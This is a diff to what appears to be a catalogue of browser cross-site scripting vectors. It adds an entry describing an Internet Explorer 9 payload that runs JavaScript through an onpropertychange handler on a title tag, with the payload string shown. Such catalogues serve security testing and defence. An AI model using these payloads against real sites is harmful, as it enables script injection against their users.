@@ -3283,7 +3283,7 @@ var items =
             'id'         : 106,
             'category'   : 'html', 
             'name'       : {
-                'en' : ' Safari attribute ofuscation with slashes and quotes',
+                'en' : 'Safari attribute ofuscation with slashes and quotes',
                 'ja' : '',
                 'ru' : 'Обфускация атрибута в Safari с использованием слешей и кавычек',
                 'de' : ''
@@ -3307,5 +3307,34 @@ var items =
             },
             'tags'       : ['xss', 'javascript', 'safari', 'attributes', 'delimiter', 'parser'],
             'reporter'   : 'Superhei, .mario'
+        },
+        { /* ID 107 - JavaScript execution via title tag on Inernet Explorer 9 */
+            'id'         : 107,
+            'category'   : 'html', 
+            'name'       : {
+                'en' : 'JavaScript execution via title tag on Inernet Explorer 9',
+                'ja' : '',
+                'ru' : '',
+                'de' : ''
+            },
+            'data'       : '<title onpropertychange=alert(1)></title><title title=>',
+            'description': {
+                'en' : 'Internet Explorer 9 allows execution of JavaScript via onpropertychange event handler on <title> tags if another <title> tag follows up - having at least one valid attribute.',
+                'ja' : '',
+                'ru' : '',
+                'de' : ''
+            },
+            'urls'    : [],
+            'howtofix'   : {
+                'en' : '',
+                'ja' : '',
+                'ru' : '',
+                'de' : ''
+            },                        
+            'browsers'   : {
+                'internet explorer' : ['9.0']
+            },
+            'tags'       : ['xss', 'javascript', 'title', 'onpropertychange', 'internet explorer'],
+            'reporter'   : '.mario'
         }
 ]
